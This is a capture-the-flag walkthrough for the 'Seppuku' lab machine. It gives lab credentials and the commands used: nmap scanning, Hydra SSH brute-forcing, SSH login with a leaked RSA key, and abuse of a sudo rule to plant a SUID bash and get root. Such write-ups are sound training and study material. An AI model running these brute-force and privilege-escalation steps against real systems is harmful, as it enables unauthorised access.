---
layout: default
title: Seppuku
parent: Proving Grounds Play
nav_order: 31
---

# Seppuku

---

## Discovered Ports for Enumeration

- 21 - FTP
- 22 - SSH
- 80 - HTTP
- 445 - SMB
- 7080 - ssl empoweri
- 7601 - HTTP
- 8088 - HTTP

## Users and Credentials

- _Users_: seppuku, samurai, tanto
- _Credentials_: seppuku:eeyoree, samurai:12345685213456!@!@A

# Scanning

---

```bash
sudo nmap -Pn -p- -sC -sV -T4 -vv --open 192.168.166.90
```

# Enumeration

---

## 21 - FTP

Anonymous logon not allowed

## 80 - HTTP

Nothing useful

## 445 - SMB

### Enum4linux

Discovers three user accounts:

- seppuku
- samurai
- tanto

![seppuku_users](../../../assets/images/ctfs/proving_grounds/seppuku/seppuku_users.png)

## 7601 - HTTP

wfuzz discovered /secret directory

![secret](../../../assets/images/ctfs/proving_grounds/seppuku/secret.png)

"password.lst" contains potential user passwords for target machine.

![password_list](../../../assets/images/ctfs/proving_grounds/seppuku/password_list.png)

wfuzz also discovered the /keys directory which contains an RSA private key

![private](../../../assets/images/ctfs/proving_grounds/seppuku/private.png)

# Exploitation

---

## Hydra password cracking

Run Hydra against the user accounts discovered by Enum4Linux and the passwords discovered in the /secrets directory

```bash
hydra -L users -P passwords ssh://192.168.166.90
```

Get the credential _seppuku:eeyoree_

![hydra](../../../assets/images/ctfs/proving_grounds/seppuku/hydra.png)

## Authenticate with RSA key

Authentication with RSA private key discovered in the /keys directory works with "tanto" user

```bash
ssh -i id_rsa tanto@192.168.166.90
```

![tanto_ssh](../../../assets/images/ctfs/proving_grounds/seppuku/tanto_ssh.png)

# Post-Exploitation

---

## Enumerate user directories

Locate _.passwd_ file located in /home/seppuku directory.

samurai:12345685213456!@!@A
{: .warn }

## sudo -l

The "samurai" user can run the following command with sudo privileges and no password:

```bash
/../../../../../../home/tanto/.cgi_bin/bin /tmp/*
```

![sudo_l](../../../assets/images/ctfs/proving_grounds/seppuku/sudo_l.png)

We can exploit this with the following steps:

1. ssh as "tanto"
2. create directory .cgi_bin
3. create "bin" file in /.cgi_bin
4. make "bin" executable
5. switch back to "samurai" user
6. execute the sudo command to create /var/tmp/bash
7. execute /var/tmp/bash and get root privileges

### SSH as tanto user

We discovered the id_rsa private key for "tanto" during enumeration

```bash
ssh -i id_rsa tanto@192.168.166.90
```

### Create /.cgi_bin/bin

```bash
mkdir .cgi_bin
cd .cgi_bin
nano bin
```

![bin_file](../../../assets/images/ctfs/proving_grounds/seppuku/bin_file.png)

Make "bin" executable

```bash
chmod +x bin
```

### Execute sudo command as samurai user

Reauthenticate as the "samurai" user and execute the privileged sudo command

```bash
/../../../../../../home/tanto/.cgi_bin/bin /tmp/*
```

### Run bash binary and get root privileges

```bash
cd /var/tmp
./bash -p
```

![root](../../../assets/images/ctfs/proving_grounds/seppuku/root.png)
